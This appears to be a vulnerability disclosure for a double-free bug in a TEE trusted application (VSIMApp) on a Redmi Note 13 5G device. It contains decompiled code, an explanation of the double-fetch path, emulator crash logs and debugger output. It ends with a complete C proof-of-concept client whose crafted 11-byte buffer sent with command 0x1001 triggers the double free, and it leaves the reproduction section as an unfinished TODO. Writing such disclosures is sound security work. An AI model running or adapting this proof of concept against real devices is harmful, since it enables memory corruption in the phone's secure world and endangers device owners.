
We identify a double-free vulnerability in a Trusted Application (TA) (UUID: `3d08821c-33a6-11e6-a1fa089e01c83aa2`), which can be triggered by exploiting a double-fetch condition on memory shared between the normal world and the secure world.

## Device Information

The build fingerprint of the device is `Redmi/iron_eea_global/iron:14/UP1A.231005.007/V816.0.18.0.UNQEUXM:user/release-keys`

The sha1 of the TA is `0e0d57e8ffef6746125a37e888d214fb3b7421f9`


## Detailed Vulnerability Analysis


This vulnerability originates in `TA_InvokeCommandEntryPoint`, which can be indirectly reached when a malicious TEE client in the normal world invokes `TEEC_InvokeCommand`.

As shown below, an attacker can supply two shared memory regions, `mem_area1` and `mem_area2`, as `params`, and set `comm_id` to `0x1001` to invoke `FUN_comm_0x1001`. 


```C
uint TA_InvokeCommandEntryPoint(undefined8 param_1,uint comm_id,uint param_3,undefined8 *params)

{
  uint uVar1;
  uint *mem_area1;
  ulong vvv1;
  ulong mem2_sz;
  uint *mem_area2;
  
  printf("[%s:%s][%s:%d]==func enter==\n","VSIMApp",&DAT_00102d0c,"TA_InvokeCommandEntryPoint",0x35)
  ;
  printf("[%s:%s][%s:%d]cmd %08x\n","VSIMApp",&DAT_00102d0c,"TA_InvokeCommandEntryPoint",0x36,
         (ulong)comm_id);
  if (((param_3 == 0x65) && (*(int *)(params + 1) == 0x608)) && (*(int *)(params + 3) == 0x608)) {
    mem_area1 = (uint *)*params;
    vvv1 = (ulong)*mem_area1;
    if (*mem_area1 == 1) {
      mem_area2 = (uint *)params[2];
      vvv1 = (ulong)mem_area1[1];
      mem2_sz = (ulong)mem_area2[1];
                    /* length check inside */
      if ((mem_area1[1] < 0x601) && (mem_area2[1] < 0x601)) {
        uVar1 = 0xfffe0004;
        if ((int)comm_id < 0x2000) {
          switch(comm_id) {
          case 0x1000:
            uVar1 = FUN_001226d0(mem_area1,mem_area2);
            break;
          case 0x1001:
            uVar1 = FUN_comm_0x1001(mem_area1,mem_area2);
            break;
          }
          // ...
```
At line 8 of `FUN_comm_0x1001`, `unhexlify` converts the data at `mem_area1 + 8` into ASCII bytes using the length specified by `*(undefined4 *)(mem_area1 + 4)`, and returns a newly allocated heap buffer, `__ptr`.

Subsequently, if `del_imsi_index` fails while reading the IMSI table, `__ptr` is freed at line 16 and the condition in the `if` statement at line 17 is then satisfied. However, if the attacker then modifies the contents of `mem_area1 + 8` to invalid value, `_get_path_from_imsi` will fail and return `0x0` as `__ptr_00`, which leads to `__ptr` being freed again at line 21, resulting in a double-free vulnerability.


This is the overall call chain of the vulnerability's POC. 


```C
1	ulong FUN_comm_0x1001(long mem_area1)
2	{
3	 uint uVar1;
4	 void *__ptr;
5	 void *__ptr_00;
6	 ulong uVar3;
7	 
8	 __ptr = (void *)unhexlify(mem_area1 + 8,*(undefined4 *)(mem_area1 + 4));
9	 if (__ptr == (void *)0x0) {
10	   printf("[%s:%s][%s:%d]unhexlify failed \n","VSIMApp","ERROR","sim_del",0x44);
11	   uVar3 = 0xfffe0001;
12	 }
13	 else if (*(int *)(mem_area1 + 4) == 0x12) {
14	   uVar1 = del_imsi_index(__ptr,9);
15	   uVar3 = (ulong)uVar1;
16	   free(__ptr);            /* free here */
17	   if (uVar1 == 0) {    
18	     __ptr_00 = (void *)_get_path_from_imsi(mem_area1 + 8,1);
19	     if (__ptr_00 == (void *)0x0) { /* failed */
20	       printf("[%s:%s][%s:%d]get sim file path error\n","VSIMApp","ERROR","sim_del",0x57);
21	       free(__ptr);        /* free again */
22	       return 0xfffe0001;
23	     }
24	   //...
```

Next, we explain how this execution flow can be achieved by manipulating the contents by `mem_area1`.


To make this easier to understand, we have added detailed comments below to explain the core logic of `unhexlify`.

Briefly, `unhexlify` converts the hexadecimal characters stored at `mem_area1 + 8` (referred to here as `org_text`) into their corresponding byte values. The valid characters are `0`–`9`, `A`–`F`, `a`–`f`, and `'\0'`. The second parameter `*(undefined4 *)(mem_area1 + 4)`, labeled here as `text_len`, must be an even number, as enforced by the condition at line 14. This is consistent with the basic requirement of `unhexlify`, since two hexadecimal characters are needed to form one byte as shown at line 58.

Eventually, the heap buffer `__ptr`, allocated at line 18, stores the converted bytes and is returned at line 62.

Additionally, to meet the condition at line 13 in `FUN_comm_0x1001`, we suggest setting `text_len` to `0x12`. Then the returned `__ptr` is freed accordingly for the first time at line 16 of `FUN_comm_0x1001`.

```C
1	void * unhexlify(long org_text,ulong text_len)
2	{
3	 byte bVar1;
4	 void *__ptr;
5	 char *__format;
6	 undefined8 uVar2;
7	 ulong uVar3;
8	 ulong idx_for_ptr;
9	 uint uVar4;
10	 uint uVar5;
11	 ulong offset;
12	 
13	  /* len of text should be even number */
14	 if ((text_len & 1) == 0) {
15	   /* allocate heap chunk of size `text_len/2`
16	       only need `text_len/2` bytes for containing ascii bytes */
17	   uVar3 = (text_len & 0xffffffff) >> 1;
18	   __ptr = (void *)heap_malloc(uVar3,0);
19	   if (__ptr == (void *)0x0) {
20	     printf("[%s:%s][%s:%d]malloc data fail\n","VSIMApp","ERROR","unhexlify",0x1b6);
21	   }
22	   else {
23	     if ((int)uVar3 == 0) {
24	       return __ptr;
25	     }
26	     offset = 0;
27	     idx_for_ptr = 0;
28	     while( true ) {
29	       bVar1 = *(byte *)(org_text + offset);
30	       uVar4 = bVar1 - 0x30;
31	       if (9 < uVar4) break;
32	LAB_00125e7c:
33	       bVar1 = *(byte *)(org_text + offset + 1); /* for lower 4 bits */
34	       uVar5 = bVar1 - 0x30; /* try to convert to number 0-9 first */
35	       if (9 < uVar5) {     
36	         uVar5 = (uint)bVar1;
37	         if (bVar1 - 0x41 < 6) { /* 'A'(0x41) ~ 'F'(0x46) */
38	           uVar5 = uVar5 - 0x37;
39	         }
40	         else {
41	           if (uVar5 - 0x61 < 6) { /* 'a'(0x61) ~ 'f'(0x66) */
42	             uVar5 = uVar5 - 0x57;
43	           }
44	           else {
45	             if (uVar5 != 0) {
46	               free(__ptr);
47	               uVar3 = (ulong)(*(byte *)(org_text + offset) + 1);
48	               __format = "[%s:%s][%s:%d]illegal lchar %u \'%x\' %x in text\n";
49	               uVar2 = 0x1c4;
50	               offset = (ulong)((int)offset + 1);
51	               goto LAB_00125fb0;
52	             }
53	             uVar5 = 0;
54	           }
55	         }
56	       }
57	       offset = offset + 2;
58	       *(byte *)((long)__ptr + idx_for_ptr) = (byte)uVar5 | (byte)(uVar4 << 4); /* combine them into a complete byte after conversion */
59	       idx_for_ptr = idx_for_ptr + 1;
60	                   
61	       if (uVar3 <= idx_for_ptr) { // try to return here with a new heap chunk filled by unhexlified text 
62	         return __ptr;
63	       }
64	     }
65	     uVar4 = (uint)bVar1; /* for higher 4 bits */
66	     // ... 
67	     // same conversion logic to uVar4
68	     if (uVar4 == 0) { /* accept `\0` as 0 */
69	       uVar4 = 0;
70	       goto LAB_00125e7c;
71	     }
72	     // 。。。
73	   }
74	 }
75	 else {
76	   printf("[%s:%s][%s:%d]text len %d is illegal\n","VSIMApp","ERROR","unhexlify",0x1af);
77	 }
78	 return (void *)0x0;
79	}
```

Later, `del_imsi_index` in `FUN_comm_0x1001` is invoked with the buffer `__ptr` as its parameter. On our test device (`Redmi Note 13 5G`), the function fails and returns **0** because the `/sim/imsi.index` file is missing. This behavior can be confirmed by the logs shown in the **Screenshots** section, specifically `Open file /sim/imsi.index fail` and `read imsi table fail`.

Furthermore, even when the file exists, it is still possible to modify `mem_area1`, which in turn affects the output of `unhexlify`. As a result, the `consttime_memcmp` check inside `del_imsi_index` fails, leading the function to return **0** as well.

At this point, the control flow enters the `if` branch starting at line 18 of `FUN_comm_0x1001` and calls `(void *)_get_path_from_imsi(mem_area1 + 8, 1)`. If this function returns **0**, the check at line 19 succeeds, which can then trigger a double-free vulnerability at line 21 in `FUN_comm_0x1001`, where `free(__ptr)` is called.

Okay, the final objective is to make `_get_path_from_imsi(mem_area1 + 8, 1)` return **0**.

This can be done by replacing one valid byte in `mem_area1 + 8` with a '\0' terminator, thereby truncating the string earlier. Once the length computed by `strlen()` drops below 0x18, the function takes the branch at lines 24–28 and eventually returns **0**.

This can be done by inserting a '\0' byte into `mem_area1 + 8`, replacing an originally valid byte. As a result, the effective string length observed by `strlen()` becomes smaller than 0x18, causing execution to enter the branch at lines 24–28. Consequently, `_get_path_from_imsi` returns **0**, as intended.


```C
1	char * _get_path_from_imsi(byte *param_1,ulong param_2)
2	{
3	 byte *__s;
4	 char *__s_00;
5	 size_t sVar1;
6	                   
7	 __s = param_1; // fetch param_1
8	 if ((param_2 & 1) == 0) { /* param_2 equals to `1`, so go to line 11 */
9	   // ...
10	 }
11	 __s_00 = (char *)heap_malloc(0x18,0);
12	 if (__s_00 != (char *)0x0) {
13	   /* directly copy from __s, i.e., param_1, to __s_00 */
14	   snprintf(__s_00,0x18,"%s%s","/sim/",__s); // 0x18 is the maximum number of bytes that can be copied.
15	 }

16	 /* change the bytes inside param_1 */
17	 sVar1 = strlen(__s_00);
18	 /* only valid for 0x17 length, so we can make param_1 less than previous size */
19	 if (sVar1 == 0x17) {
20	   printf("[%s:%s][%s:%d]sim path: %s\n","VSIMApp",&DAT_00102d0c,"_get_path_from_imsi",0x6a,__s_00)
21	   ;
22	 }
23	 else { /* enter here and return 0 */
24	   printf("[%s:%s][%s:%d]path size %s (%lu/%d) is not expected\n","VSIMApp","ERROR",
25	          "_get_path_from_imsi",0x65,__s_00,sVar1,0x17);
26	   free(__s_00);
27	                   
28	   __s_00 = (char *)0x0;
29	 }
30	 return __s_00;
31	}
```


Until now, everything is quite clear: by manipulating the shared memory between different fetches (if the specific file is not missing), we can pass the checks successfully and eventually trigger the double-free bug.



## Screenshots for Validity


```C
[+]     [%s:%s][%s:%d]==func: 0
[+]     enter==: 0
[+]     VSIMApp: 0
[+]     INFO: 0
[+]     TA_CreateEntryPoint: 0
[+]     exit==: 0
[=]     [TA_OpenSessionEntryPoint] start @0x55555557a0a8
[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:34]==func enter==

[=]     printf: [VSIMApp:INFO][TA_OpenSessionEntryPoint:36]==func exit==

[=]     [TA_OpenSessionEntryPoint] reach end @0x55555557a118
[+]
[+]     syscalls called
[+]     ------------------------
[+]
[+]     strings ocurrences
[+]     ------------------------
[+]     [%s:%s][%s:%d]==func: 0
[+]     enter==
: 0
[+]     VSIMApp: 0
[+]     INFO: 0
[+]     TA_CreateEntryPoint: 0
[+]     exit==
: 0
[+]     TA_OpenSessionEntryPoint: 0
[+]     TEEC_InvokeCommand 0 0 0x0
3d08 custom harness!!!! Placing input: b'd\x01\x00\x00\x00\x00\x00\x00'
[+]     mem p 0x608
[+]     mem p 0x608
[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:53]==func enter==
[=]     printf: [VSIMApp:INFO][TA_InvokeCommandEntryPoint:54]cmd 00001001
[=]     TEE_Malloc: allocated 0x104 at 0xaaaab020
[=]     redzone hook 0xaaaab000
[+]     ASAN: hook rw for redzone [0xaaaab000:0xaaaab020]
[=]     redzone hook 0xaaaab124
[+]     ASAN: hook rw for redzone [0xaaaab124:0xaaaac000]
[=]     strlen 0x555555558c4c: 15
[=]     TEE_OpenPersistentObject:
[=]             objectID b'/sim/imsi.index'
[=]             file name: ./emulate/files/2147483648/-sim-imsi.index
[=]             ret 0xffff0008
[=]     printf: [VSIMApp:ERROR][read_data:118]Open file /sim/imsi.index fail, err: ffff0008

[=]     printf: [VSIMApp:ERROR][del_imsi_index:221]read imsi table fail, err: ffff0008

[=]     free: freeing memory at 0xaaaab020
[+]     ASAN: unhook rw for redzone [0xaaaab000:0xaaaab020]
[+]     ASAN: unhook rw for redzone [0xaaaab124:0xaaaac000]
[=]     free: freeing memory at 0xaaaaa020
[+]     ASAN: unhook rw for redzone [0xaaaaa000:0xaaaaa020]
[+]     ASAN: unhook rw for redzone [0xaaaaa020:0xaaaab000]
[=]     TEE_Malloc: allocated 0x18 at 0xaaaaa020
[=]     redzone hook 0xaaaaa000
[+]     ASAN: hook rw for redzone [0xaaaaa000:0xaaaaa020]
[=]     redzone hook 0xaaaaa038
[+]     ASAN: hook rw for redzone [0xaaaaa038:0xaaaab000]
[=]     snprintf: len: 0x18 "b'/sim/\x00'" written to 0xaaaaa020, lr: 0x55555557902c
[=]     strlen 0xaaaaa020: 5
[=]     printf: [VSIMApp:ERROR][_get_path_from_imsi:101]path size /sim/ (5/23) is not expected

[=]     free: freeing memory at 0xaaaaa020
[+]     ASAN: unhook rw for redzone [0xaaaaa000:0xaaaaa020]
[+]     ASAN: unhook rw for redzone [0xaaaaa038:0xaaaab000]
[=]     printf: [VSIMApp:ERROR][sim_del:87]get sim file path error

[x]     corrupted free at: 0xaaaaa020, {'allocated': {}, 'freed': {2863312928: 260, 2863308832: 24}, 'redzones': {}}
[x]     =================[lr: 0x555555576a0c] [free] memory corruption detected!!
[x]     CPU Context:
[x]     x0      : 0xaaaaa020
[x]     x1      : 0x55555555a99a
[x]     x2      : 0x555555558f51
[x]     x3      : 0x55555555595e
[x]     x4      : 0x57
[x]     x5      : 0xaaaaa020
[x]     x6      : 0x5
[x]     x7      : 0x17
[x]     x8      : 0xcacacacacacacaca
[x]     x9      : 0x55555555c9b8
[x]     x10     : 0x55555557a374
[x]     x11     : 0x3c
[x]     x12     : 0x0
[x]     x13     : 0x0
[x]     x14     : 0x0
[x]     x15     : 0x0
[x]     x16     : 0x5555555b24d8
[x]     x17     : 0x99999098
[x]     x18     : 0x0
[x]     x19     : 0xaaaaa020
[x]     x20     : 0x0
[x]     x21     : 0xbbbbe008
[x]     x22     : 0x55555555a99a
[x]     x23     : 0x555555556d0c
[x]     x24     : 0x55555555a3e8
[x]     x25     : 0x0
[x]     x26     : 0x0
[x]     x27     : 0x0
[x]     x28     : 0x0
[x]     x29     : 0x8000002dddc0
[x]     x30     : 0x555555576a0c
[x]     sp      : 0x8000002ddda0
[x]     pc      : 0xdeadbeef
[x]     lr      : 0x555555576a0c
[x]     cpacr_el1       : 0x300000
[x]     pstate  : 0x800003c5
[x]     PC = 0x00000000deadbeef (unreachable)

[x]     Memory map:
[x]     Start            End              Perm    Label                                    Image
[x]     00000000eee000 - 00000000eef000   rw-     [fuchsia] tls
[x]     00000000f00000 - 00000000f10000   rw-     [fuchsia] thread-stack
[x]     00000099999000 - 0000009999a000   rwx     dl_resolve
[x]     000000bbbbb000 - 000000bbbbc000   rw-     session_id
[x]     000000bbbbc000 - 000000bbbbd000   rw-     session_context
[x]     000000bbbbd000 - 000000bbbbe000   rw-     TEE_Params
[x]     000000bbbbe000 - 000000bbbbf000   rw-     shared_memory_0
[x]     000000bbbbf000 - 000000bbbc0000   rw-     shared_memory_1
[x]     000000eeeee000 - 000000eeef0000   rwx     [hook_mem]
[x]     00555555554000 - 00555555573000   r--     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
[x]     00555555573000 - 005555555af000   r-x     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
[x]     005555555af000 - 005555555be000   rw-     3d08821c-33a6-11e6-a1fa089e01c83aa2.ta   /srv/emulator/rootfs/3d08821c-33a6-11e6-a1fa089e01c83aa2.ta
[x]     007ffff7dd5000 - 007ffff7e28000   r--     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffff7e28000 - 007ffff7e99000   r-x     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffff7e99000 - 007ffff7ea0000   rw-     ld.so.1                                  /srv/emulator/rootfs/ld.so.1
[x]     007ffffffde000 - 008000002de000   rwx     [stack]
Traceback (most recent call last):
```




### Source code of the POC

As you can see from the POC, it is unnecessary to modify the contents of `mem_area1` or race against the checks with an additional thread, because the absence of the `/sim/imsi.index` file makes it easier for `del_imsi_index` to return zero in our device (`Redmi Note 13 5G`).

What we do here is simply set `*(int *)(mem_area1 + 4)` as 0x12 and put the single `\0` byte at the offset 8:
> 0x01, 0x00, 0x00, 0x00, **0x12**, 0x00, 0x00, 0x00, **0x00**, 0x36, 0x00

That alone is enough to trigger the double free automatically.


```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    void* mem_area1 = allocate_param_mem(context, 0x1000);
    void* mem_area2 = allocate_param_mem(context, 0x1000);
  
	unsigned char ___mitee_harness_3d08_fuzz_out_default_crashes_id_000001_sig_06_src_000038_time_2321836_execs_139577_op_havoc_rep_1[] = {
	  0x01, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00
	};
	unsigned int ___mitee_harness_3d08_fuzz_out_default_crashes_id_000001_sig_06_src_000038_time_2321836_execs_139577_op_havoc_rep_1_len = 11;

	memcpy(mem_area1,  ___mitee_harness_3d08_fuzz_out_default_crashes_id_000001_sig_06_src_000038_time_2321836_execs_139577_op_havoc_rep_1, ___mitee_harness_3d08_fuzz_out_default_crashes_id_000001_sig_06_src_000038_time_2321836_execs_139577_op_havoc_rep_1_len);
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,TEEC_MEMREF_TEMP_OUTPUT, TEEC_NONE, TEEC_NONE);
    
	printf("params: 0x%lx\n", op.paramTypes);
    op.params[0].tmpref.buffer = mem_area1; 
    op.params[0].tmpref.size =  0x608; 
    op.params[1].tmpref.buffer = mem_area2; 
    op.params[1].tmpref.size =  0x608; 
    
	TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x1001, &op, &err_origin);
	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);

}


int main(int argc, char **argv)
{
    char* ta = "3d08821c-33a6-11e6-a1fa089e01c83aa2";
    TEEC_UUID *uuid = teegris_uuid(ta);

    TEEC_Context context;
    TEEC_Session session;
    uint32_t err_origin;
    TEEC_Result res;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    // write banner
    printf("[+] sending query...\n");
    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
```

For more context, in this PoC, the final `strlen(__s_00)` in `_get_path_from_imsi` ends up as 5, less than 0x17.

```C
$x0      : 0x0000000000000005
$x1      : 0x0000000000000018
$x2      : 0x000055555555b3e1  ->  0x6165720073257325 ('%s%s'?)
$x3      : 0x000055555555b246  ->  0x7400002f6d69732f ('/sim/'?)
$x4      : 0x00000000bbbbe008  ->  0x0000000000003600
...
-------------------------------------------------------------------- stack ----
  $sp  0x8000002ddd70|+0x0000|+000: 0x000055555555a99a  ->  0x007070414d495356 ('VSIMApp'?)  <-  $x22
       0x8000002ddd78|+0x0008|+001: 0x00000000bbbbe008  ->  0x0000000000003600  <-  $x4, $x20
       0x8000002ddd80|+0x0010|+002: 0x0000000000000000
       0x8000002ddd88|+0x0018|+003: 0x00000000aaaaa020  ->  0x0000002f6d69732f ('/sim/'?)  <-  $x21
 $x29  0x8000002ddd90|+0x0020|+004: 0x00008000002dddc0  ->  0x00008000002dde00  ->  0x0000000000000000
       0x8000002ddd98|+0x0028|+005: 0x0000555555576990  ->  0xaa1f03e1b4000260
       0x8000002ddda0|+0x0030|+006: 0x0000000000001001
       0x8000002ddda8|+0x0038|+007: 0x0000000000000000
--------------------------------------------- code: arm64:ARM (gdb-native) ----
    0x555555579034 c9070094          <NO_SYMBOL>   bl     0x55555557af58
    0x555555579038 e00315aa          <NO_SYMBOL>   mov    x0, x21
*   0x55555557903c d5d60094          <NO_SYMBOL>   bl     0x5555555aeb90        // call to strlen()
*-> 0x555555579040 1f5c00f1          <NO_SYMBOL>   cmp    x0, #0x17
    0x555555579044 a1010054          <NO_SYMBOL>   b.ne   0x555555579078 // b.any
    0x555555579048 00ffff90          <NO_SYMBOL>   adrp   x0, 0x555555559000  ('%s:%d]apdu error\n')
    0x55555557904c 01ffffb0          <NO_SYMBOL>   adrp   x1, 0x55555555a000  ('F0FA2C892376C84ACE1BB4E3019B71634C01131159CAE03CEE9D9932184BEEF2[...]')
    0x555555579050 e2feffb0          <NO_SYMBOL>   adrp   x2, 0x555555556000  ('alid\n'?)
    0x555555579054 e3feff90          <NO_SYMBOL>   adrp   x3, 0x555555555000
------------------------------------------------------------------ threads ----
[*Thread Id:1, tid:6550] Name: "3d08821c-33a6-11e6-a1fa089e01c83aa2.ta", stopped at 0x555555579040 <NO_SYMBOL>, reason: BREAKPOINT
```


### Vulnerability Reproduction


1. preacquisition
2. interaction

#TODO